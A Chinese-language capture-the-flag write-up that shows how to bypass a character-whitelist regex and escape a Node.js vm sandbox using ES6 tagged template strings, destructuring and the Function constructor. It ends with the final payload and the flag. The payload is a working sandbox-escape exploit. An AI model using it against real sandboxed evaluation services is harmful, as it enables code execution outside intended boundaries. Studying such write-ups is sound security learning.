# Temple JS

ES6新引入了模板字符串，使用反引号括起来的字符串可以内嵌模板，也可以调用所谓的“标签”（任何普通函数都可以），如：

```js
`abc${1+1}` //"abc2"
somefunction`abc${1}def${2}ghi` //somefunction(["abc","def","ghi",{"raw":"..."}], 1, 2)
```

查看题目源码，整体流程是对我们输入的字符串进行过滤，然后放到vm里执行。过滤用的正则是``/^[a-zA-Z0-9 ${}`]+$/g``，同时也给了一个函数``par: (v => `(${v})` ``，用来加括号。我们的目的是得到在vm外的global.flag。

首先本机跑一下，去掉正则限制，发现下面的payload可以得到flag，绕沙箱不是本题重点：

```js
par.constructor.constructor(`return flag`)()
```

不用点来调用成员，可以考虑[解构赋值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment)：

```js
function fff({constructor}){return constructor};

用模板字符串的方式写=>
`function fff({constructor}){return constructor}`

为了加上括号，同时将{constructor}作为第二个参数传入=>
`${`function fff${par`a${1}{constructor}`}{return constructor}`}`
```

现在我们写出来的，只是一个字符串而已。怎么调用eval来执行这个字符串呢，用\`\`必然会让第一个参数变成数组，导致eval失败。我们可以使用[Function构造函数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function)直接建立一个eval第二个参数的函数，然后就可以将我们的字符串eval出来了：

```js
Function`a${`return eval${par`b`}`}b``${`function fff${par`a${1}{constructor}`}{return constructor}`}`

fff(par)("return flag")() => `...fff``${par}``return flag```
```

所以最后的payload就是：

```js
Function`a${`return eval${par`b`}`}b``${`function fff${par`a${1}{constructor}`}{return constructor}fff`}``${par}``return flag```
```

`p4{js_template_strings_are_so_functional}`
